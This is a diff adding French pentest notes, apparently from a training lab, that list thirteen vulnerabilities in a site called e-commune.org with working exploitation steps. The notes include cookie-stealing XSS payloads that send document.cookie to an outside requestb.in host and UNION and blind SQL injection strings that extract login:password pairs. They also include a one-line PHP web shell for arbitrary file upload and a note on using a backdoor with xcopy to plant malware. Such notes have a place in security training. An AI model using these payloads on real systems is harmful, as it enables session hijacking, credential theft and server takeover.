@@ -1,0 +1,99 @@
+vulnérabilités :
+01 - flux réseau non chiffré (ok)
+    exploitation : moyenne
+    risque : élevé
+    correction : moyenne
+    => wireshark
+    (letsencrypt.com => signe vos certificats gratuitement)
+02 - mot de passe faible accepté (ok)
+03 - fuite d'informations techniques
+    => (Server & X-Powered-By) dans le flux
+envoyé par le serveur lors de l'étape de login (ok)
+    => http://www.e-commune.org/modules/gallerie/index.php (ok)
+    => http://www.e-commune.org/www/ (ok)
+    => fuite de chemin local (http://www.e-commune.org/superadmin/test.php)
+(ok)
+04 - énumération de la liste des utilisateurs (ok)
+    => http://www.e-commune.org/lost_login.php
+05 - redirection ouverte vers url externe (ok)
+    => http://www.e-commune.org/accueil/accueil_visiteur.php?redirect=http://www.e-commune.org
+06 - affichage du contenu des dossiers autorisé (directory listing) (ok)
+07 - backdoor permettant de lancer une commande en mode admin (ok)
+    => http://www.e-commune.org/superadmin/test.php
+    => possible de copier un malware sur le serveur en utilisant un dossier
+partagé et la commande xcopy
+    => possible de récupérer toutes les sources de e-commune en utilisant
+xcopy
+08 - cross-site scripting (ok)
+    => mails
+    => http://www.e-commune.org/index.php?cat=administration&ncat=<script>alert(1)</script>
+PAYLOAD1:
+<script>
+document.location="https://requestb.in/1ldfpr41?cookie="+document.cookie
+</script>
+PAYLOAD2:
+<script>
+document.write('<img width=0 height=0 src="https://requestb.in/1ldfpr41?cookie=' + document.cookie + ' " />');
+</script>
+09 - drapeaux des cookies HTTPOnly et secure non activés (ok)
+10 - fichiers sensibles accessibles (ok)
+    => index.php~
+    => http://www.e-commune.org/admin/upload/bbb.ini.jpg
+    => http://www.e-commune.org/courrier.txt
+
+11 - injection SQL (ok)
+    => http://www.e-commune.org/index.php?cat=citoyen&ncat=0 OR 1=1
+SELECT * FROM ma_table;
+SELECT * FROM ma_table WHERE id = 10:
+SELECT * FROM utilisateurs WHERE login = "xxxx" AND password = "yyyy"
+SELECT * FROM utilisateurs WHERE login = 'admin'#' AND password = 'yyyy'
+
+identification du nombre de colonnes de la base SQL
+http://www.e-commune.org/index.php?cat=citoyen&ncat=42 UNION SELECT
+1,2,3,4,5,6,7,8,9 => success => valeur "8" affichée
+http://www.e-commune.org/index.php?cat=citoyen&ncat=42 UNION SELECT
+1,2,3,4,5,6,7,user(),9 => login de la BDD "root@localhost"
+http://www.e-commune.org/index.php?cat=citoyen&ncat=42 UNION SELECT
+1,2,3,4,5,6,7,version(),9 => version "5.5.27-log"
+
+interrogation de information_schema pour récupérer le nom des tables et
+colonnes de notre bdd cible:
+http://www.e-commune.org/index.php?cat=citoyen&ncat=42 UNION SELECT
+1,2,3,4,5,6,7,table_name,9 FROM information_schema.tables => tables
+utilisateur et users intéressantes
+http://www.e-commune.org/index.php?cat=citoyen&ncat=42 UNION SELECT
+1,2,3,4,5,6,7,column_name,9 FROM information_schema.columns WHERE table_name =
+"utilisateur" => affiche les colonnes de la table "utilisateur" (login et
+password sont intéressants)
+
+extraction des login & password de la table utilisateur:
+http://www.e-commune.org/index.php?cat=citoyen&ncat=42 UNION SELECT
+1,2,3,4,5,6,7,concat(login,':',password),9 FROM utilisateur => login,password
+
+    b - injection SQL en aveugle
+        => http://www.e-commune.org/lost_login.php
+        => a" OR 1=1#
+SELECT * FROM utilisateur WHERE login = "xxxx"
+SELECT * FROM utilisateur WHERE login = "a" => false
+SELECT * FROM utilisateur WHERE login = "a" OR 1=1#" => true
+SELECT * FROM utilisateur WHERE login = "a" OR "x"="x" => true
+SELECT * FROM utilisateur WHERE login = "admin" AND password = "admin"#" =>
+false
+SELECT * FROM utilisateur WHERE login = "admin" AND substring(champ, position,
+taille)
+SELECT * FROM utilisateur WHERE login = "admin" AND substring(password, 1, 1)
+= "1"# => false
+SELECT * FROM utilisateur WHERE login = "admin" AND substring(password, 1, 1)
+= "2"# => true
+
+12 - upload de fichier arbitraire
+    => backdoor.jpg.php
+    => <?php system($_GET['cmd_esiea']); ?>
+
+utilisation de burp
+    => désactiver l'envoi de formulaires automatiques dans spider
+    => proxy - intercept is off
+
+13 - mauvais cloisonnement des profils utilisateurs
+    => http://www.e-commune.org/index.php?cat=&ncat=20&rub=messages&nrub=21&srub=recus&nsrub=23&id_user=9
+    => http://www.e-commune.org/index.php?cat=&ncat=20&rub=messages&nrub=21&srub=recus&nsrub=23&id_user=0
